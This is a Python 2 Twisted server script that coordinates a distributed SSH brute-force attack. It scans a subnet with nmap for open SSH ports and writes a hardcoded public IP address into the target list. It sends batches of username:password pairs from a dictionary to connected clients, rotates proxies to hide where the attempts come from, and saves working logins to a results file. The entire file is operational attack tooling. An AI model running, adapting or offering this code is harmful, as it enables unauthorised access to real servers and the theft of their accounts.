import sys
import os

from twisted.internet import ssl, protocol, task, defer
from twisted.python import log
from twisted.python.modules import getModule
from twisted.internet.protocol import Factory, Protocol
from twisted.internet import reactor
from OpenSSL import SSL
import subprocess
import json
import time
import argparse
import itertools



clients={}
filecont=0
failed=[]
proxies=[]
proxynum=0
next_proxy=0
active_clients=0
class ServerContextFactory:
    def getContext(self):
        pemfile="server.pem"
        ctx = SSL.Context(SSL.SSLv23_METHOD)        #setup SSL connection
        try:
            ctx.use_certificate_file(pemfile)
            ctx.use_privatekey_file(pemfile)
        except:
            print 'You need to have a PEM file for the server to work. If it is not in your same directory, just point to it with -P switch'
        return ctx
class Echo(Protocol):
    def dataReceived(self, data):       #this method is called when data is received
        global clients
        global filecont
        global failed
        global proxynum
        global next_proxy
        global active_clients
        data=json.loads(data)
        print data
        if data['command']=='hello':    #we have a dictionary for server client communication. data['command'] represents the "command" that is transported from one to the other
            clients[data['client_id']]={}
            clients[data['client_id']]['status']='online'
            clients[data['client_id']]['lastcommand']=''
            clients[data['client_id']]['numberofcommands']=0
            active_clients+=1
            activeips=open('ips.txt','r')
            data['command']='ips'
            part=''
            cnt=1
            data['proxy']='none'
            for line in activeips:
                part=part+line
                cnt+=1
                if cnt==15000:
                    data[data['command']]=part
                    self.transport.write(json.dumps(data))#send a number of ips,which we get from the ips file, to the client
                    cnt=1
                    part=''
            data[data['command']]=part
            self.transport.write(json.dumps(data))
            del data[data['command']]
            activeips.close()
            data['command']='end'
            self.transport.write(json.dumps(data))
            print "Sent all files"
        elif data['command']=='ready':
            data['command']='execute'
            temp=[]
            cnt=0
            times=0
            with open('credentials.txt','r') as f:
                for line in itertools.islice(f,filecont,filecont+3):#take a number of credentials from the credentials file
                    if line=='\n':
                        continue
                    else:
                        temp.append(line)
                        cnt+=1
            filecont+=cnt
            print data['proxy']
            if data['proxy']=='none':
                pass
            else: 
                if next_proxy>=proxynum:        #select a proxy from the proxy file
                    next_proxy=0
                data['proxy']=proxies[next_proxy]
                next_proxy+=1
            data[data['command']]=temp      #data[data['command']] represents the content that is essential for the execution of the "command". In this case the credentials
            if len(temp)==0:
                data['command']='terminate'
                active_clients-=1
                self.transport.write(json.dumps(data))
            if active_clients==0:
                print "Finished trying with this file"
            clients[data['client_id']]['numberofcommands']+=1
            clients[data['client_id']]['status']='executing'
            self.transport.write(json.dumps(data))
        elif data['command']=='finished':
            if len(data[data['command']])>0:        #if we find a match, we write it to the results file
                result=open('result.txt','a')
                for each in data[data['command']]:
                    result.write(each+'\n')
                del data[data['command']]
                result.close()
            data['command']='wait'
            data[data['command']]=2
            self.transport.write(json.dumps(data))
            clients[data['client_id']]['status']=data['command']='finished'
            data[data['command']]='waiting'
        elif data['command']=='error':            #in case of error, we resend the command and data as is until we get no error
            failed=data[data['command']]
            del data[data['command']]
            data['command']='execute'
            data[data['command']]=failed
            if data['proxy']=='none':
                pass
            else: 
                if next_proxy>=proxynum:
                    next_proxy=0
                data['proxy']=proxies[next_proxy]
                next_proxy+=1
            self.transport.write(json.dumps(data))
        else:
            print 'else'            #this is for troubleshooting only. It usually never gets here

def make_cred(filename):
    usr=open('users.txt','r')
    num_lines = sum(1 for line in open('dictionary.txt'))
    nl=sum(1 for line in open('users.txt'))
    combs=open(filename,'w')
    for u in usr:
        di=open('dictionary.txt','r')
        for i in range(1,num_lines):                    #this is a method that takes a file with usernames and a file with passwords and makes a file with all the combinations of both in the format: username:password. This method is optional
            d = di.next()
            u=u.strip('\n').strip('\r').strip(' ')
            d=d.strip('\n').strip('\r').strip(' ')
            c=str(u+':'+d+'\n')
            combs.write(c)   
        di.close() 
    combs.close()
    usr.close()

interf=''
port=0
def main():
    global ips
    global interf
    global port
    global proxies
    global proxynum
    vernum='1.0'
    parser = argparse.ArgumentParser(description='server version ' + vernum)
    parser.add_argument('-f', dest='credentials', action='store',default='credentials.txt')#Parse arguments 
    parser.add_argument('-p', dest='port', action='store', default=46001)
    parser.add_argument('-i', dest='interface', action='store', default='127.0.0.1')
    parser.add_argument('-P', dest='pemfile', action='store', default='server.pem')
    parser.add_argument('-L', dest='logfile', action='store', default='server.log')
    parser.add_argument('--creds',dest='mkcred',action='store',default='no')
    #parser.add_argument('-l', dest='loglevel', action='store', default='info', help='Log level. Defaults to info.')
    #parser.add_argument('-v', dest='verboselevel', action='store', type=int, default=1, help='Verbosity level. Give a number between 1 and 5. Defaults to 1. Level 0 is quiet.')
    #parser.add_argument('-t', dest='clienttimeout', action='store', type=int, default=3600, help='Number of seconds before classifying a client as offline. Default is 3600 (1 hour)')
    #parser.add_argument('-s', dest='sorttype', default='Status', help='Field to sort the statical value. You can choose from: Alias, #Commands, UpTime, RunCmdXMin, AvrCmdXMin, Status')
    args = parser.parse_args()
    if args.mkcred=='yes':
        print "Started making credentials"
        make_cred(args.credentials)

    interf=args.interface
    port=args.port
    print "Starting scan for available network nodes..."
    p1=subprocess.Popen(['nmap','-p','22','--open','-sV','192.168.66.0/24','-T5'],stdout=subprocess.PIPE)
    #p1=subprocess.Popen(['nmap','--open','-sV','192.168.66.0/24','-T5'],stdout=subprocess.PIPE)    
    p2=subprocess.Popen(['grep','-B','4','ssh'],stdin=p1.stdout,stdout=subprocess.PIPE)
    p3=subprocess.Popen(['grep','-E','-o','([0-9]{1,3}[\.]){3}[0-9]{1,3}'],stdin=p2.stdout,stdout=subprocess.PIPE)
    output=p3.stdout.read()
    print "Scan ended! Saving nodes to file..."#this part uses nmap to scan for devices nearby that have their ssh port open. The command can be modified
    fil=open('ips.txt','w')     #here we open a file to write the ips we found. You can write a specific ip using the command: fil.write(str(<<ip>>)+'\n')
    fil.write('83.212.72.204'+'\n')
    
    fil.close()
    fil=open('proxies.txt','r') #load all proxies in memory. they are used in order repeatedly.
    for line in fil:
        proxies.append(line)

    #print proxies
    proxynum=len(proxies)
    logger=open(args.logfile,'a')

    
if __name__ == '__main__':
    main()
    print "Ready..."
    f = Factory()
    f.protocol = Echo
    reactor.listenSSL(int(port), f, ServerContextFactory(),interface=interf)#starts the server
    reactor.run()
